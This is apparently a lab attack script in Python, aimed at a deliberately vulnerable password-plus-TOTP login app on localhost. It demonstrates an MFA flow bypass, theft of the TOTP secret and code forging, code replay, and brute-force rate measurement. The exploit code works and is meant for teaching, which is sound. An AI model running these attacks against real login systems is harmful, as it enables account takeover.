"""
ATTACK DEMONSTRATION — System 2: Vulnerable Password + TOTP MFA
Four attack vectors:

  Attack 1 — MFA Bypass (flow logic flaw, V6)
             Skip the TOTP step entirely by navigating past it.
  Attack 2 — Secret Leakage (V4/V5)
             Pull the TOTP secret -> become the authenticator forever.
  Attack 3 — Code Replay (V2)
             A code that already worked keeps working.
  Attack 4 — Code Brute Force (V1/V3)
             Demonstrate the rate + prove the 7-code window surface.

Target: http://127.0.0.1:5002
Run AFTER starting vulnerable/app.py
"""

import requests
import pyotp
import time

TARGET = "http://127.0.0.1:5002"
USERNAME = "admin"
PASSWORD = "SuperSecret123"


# ─────────────────────────────────────────────────────────────
# ATTACK 1 — MFA BYPASS (V6: broken flow logic)
#
# The app sets session['user'] after the PASSWORD step. /dashboard only
# checks for session['user'], NOT session['mfa_passed']. So we complete
# step 1, then navigate straight to /dashboard — skipping TOTP entirely.
# ─────────────────────────────────────────────────────────────

def attack_mfa_bypass():
    print("\n" + "═" * 60)
    print("ATTACK 1 — MFA Bypass via Broken Flow Logic")
    print("═" * 60)

    s = requests.Session()

    # Step 1: submit ONLY the password
    r = s.post(f"{TARGET}/login", data={"username": USERNAME, "password": PASSWORD})
    print(f"  [*] Submitted password. Redirected to: {r.url}")

    # Step 2: skip TOTP — go straight to the protected dashboard
    r = s.get(f"{TARGET}/dashboard")
    print(f"  [*] Navigated directly to /dashboard (no TOTP submitted)")

    if "Dashboard" in r.text and USERNAME in r.text:
        stage = "PASSWORD ONLY" if "MFA skipped" in r.text else "FULL"
        print(f"  [+] BYPASS SUCCESSFUL — reached dashboard at MFA stage: {stage}")
        print(f"  [+] The second factor was never required.")
        return True
    print(f"  [-] Bypass failed (dashboard enforced MFA)")
    return False


# ─────────────────────────────────────────────────────────────
# ATTACK 2 — SECRET LEAKAGE (V4 plaintext DB + V5 exposed endpoint)
#
# The /totp-secret endpoint returns the raw base32 secret with no auth.
# Once we have the secret, we can generate valid codes ourselves — forever.
# We ARE the authenticator now. Rotating the password does not help; only
# rotating the secret does.
# ─────────────────────────────────────────────────────────────

def attack_secret_leak():
    print("\n" + "═" * 60)
    print("ATTACK 2 — TOTP Secret Leakage")
    print("═" * 60)

    # Pull the secret from the unauthenticated endpoint
    r = requests.get(f"{TARGET}/totp-secret", params={"user": USERNAME})
    data = r.json()
    secret = data["totp_secret"]
    print(f"  [+] Leaked TOTP secret: {secret}")
    print(f"  [+] Provisioning URI:   {data['provisioning_uri']}")

    # Now generate a valid code and complete a full login
    s = requests.Session()
    s.post(f"{TARGET}/login", data={"username": USERNAME, "password": PASSWORD})

    forged_code = pyotp.TOTP(secret).now()
    print(f"  [*] Generated valid code from leaked secret: {forged_code}")

    r = s.post(f"{TARGET}/verify-totp", data={"code": forged_code})
    if "Dashboard" in r.text:
        print(f"  [+] Full login completed using a self-generated code.")
        print(f"  [+] Attacker now passes MFA indefinitely. Only secret rotation helps.")
        return True
    print(f"  [-] Code rejected (unexpected)")
    return False


# ─────────────────────────────────────────────────────────────
# ATTACK 3 — CODE REPLAY (V2: no replay protection)
#
# A correctly implemented server marks a code as consumed after first use.
# This app does not. We submit the same code twice and it succeeds both
# times — meaning a code captured (via phishing, shoulder-surf, MITM) can
# be reused within its validity window.
# ─────────────────────────────────────────────────────────────

def attack_replay():
    print("\n" + "═" * 60)
    print("ATTACK 3 — Code Replay")
    print("═" * 60)

    # For the demo we know the secret (would be captured in a real scenario)
    secret = requests.get(f"{TARGET}/totp-secret", params={"user": USERNAME}).json()["totp_secret"]
    code = pyotp.TOTP(secret).now()
    print(f"  [*] Captured code: {code}")

    successes = 0
    for attempt in range(1, 4):
        s = requests.Session()
        s.post(f"{TARGET}/login", data={"username": USERNAME, "password": PASSWORD})
        r = s.post(f"{TARGET}/verify-totp", data={"code": code})
        ok = "Dashboard" in r.text
        successes += ok
        print(f"  [{'+'  if ok else '-'}] Reuse attempt {attempt}: {'ACCEPTED' if ok else 'rejected'}")

    if successes > 1:
        print(f"  [+] Same code accepted {successes} times — no replay protection.")
        return True
    print(f"  [-] Replay blocked")
    return False


# ─────────────────────────────────────────────────────────────
# ATTACK 4 — BRUTE FORCE SURFACE (V1 no rate limit + V3 window=3)
#
# We do NOT run a full multi-minute brute force here. Instead we PROVE the
# attack surface two ways:
#   (a) measure the achievable request rate (no throttling)
#   (b) prove that 7 codes are accepted at once (window=3), not just 1
# Then we state the time-to-crack math.
# ─────────────────────────────────────────────────────────────

def attack_bruteforce_surface():
    print("\n" + "═" * 60)
    print("ATTACK 4 — Brute Force Attack Surface")
    print("═" * 60)

    # (a) Measure request rate against /verify-totp with wrong codes
    s = requests.Session()
    s.post(f"{TARGET}/login", data={"username": USERNAME, "password": PASSWORD})

    N = 200
    start = time.time()
    for i in range(N):
        s.post(f"{TARGET}/verify-totp", data={"code": "000000"})
    elapsed = time.time() - start
    rate = N / elapsed
    print(f"  [*] Sent {N} wrong codes in {elapsed:.2f}s -> {rate:.0f} req/s")
    print(f"  [*] No throttling, no lockout observed after {N} failures.")

    # (b) Prove the 7-code window surface (window=3)
    secret = requests.get(f"{TARGET}/totp-secret", params={"user": USERNAME}).json()["totp_secret"]
    totp = pyotp.TOTP(secret)
    now = time.time()
    print(f"\n  [*] Testing which time-step codes the server accepts (window=3):")
    accepted = 0
    for offset in range(-4, 5):  # test -4..+4 to show boundary
        code = totp.at(now + offset * 30)
        s2 = requests.Session()
        s2.post(f"{TARGET}/login", data={"username": USERNAME, "password": PASSWORD})
        r = s2.post(f"{TARGET}/verify-totp", data={"code": code})
        ok = "Dashboard" in r.text
        accepted += ok
        marker = "ACCEPTED" if ok else "rejected"
        print(f"      step {offset:+d} (code {code}): {marker}")
    print(f"\n  [+] {accepted} codes valid simultaneously (secure config = 1).")

    # (c) The math
    guesses_per_window = int(rate * 30)
    p_per_window = min(1.0, guesses_per_window * accepted / 1_000_000)
    print(f"\n  [*] Time-to-crack estimate at this rate:")
    print(f"      Guesses per 30s window : ~{guesses_per_window:,}")
    print(f"      Valid codes per window : {accepted}")
    print(f"      Hit chance per window  : ~{p_per_window*100:.1f}%")
    if p_per_window > 0:
        windows = 1 / p_per_window
        print(f"      Expected windows       : ~{windows:.0f}  (~{windows*30/60:.1f} minutes)")
    print(f"  [!] With rate limiting (5 attempts + lockout), this drops to ~0%.")


if __name__ == "__main__":
    print("╔══════════════════════════════════════════════════════════╗")
    print("║  SYSTEM 2 — TOTP/MFA Attack Chain                       ║")
    print("║  Target: Vulnerable Password + TOTP (port 5002)         ║")
    print("╚══════════════════════════════════════════════════════════╝")

    results = {
        "MFA Bypass":      attack_mfa_bypass(),
        "Secret Leakage":  attack_secret_leak(),
        "Code Replay":     attack_replay(),
    }
    attack_bruteforce_surface()

    print("\n" + "═" * 60)
    print("SUMMARY")
    for name, ok in results.items():
        print(f"  {name:18s}: {'SUCCESS' if ok else 'failed'}")
    print("  Brute Force       : surface demonstrated (see math above)")
    print("═" * 60)
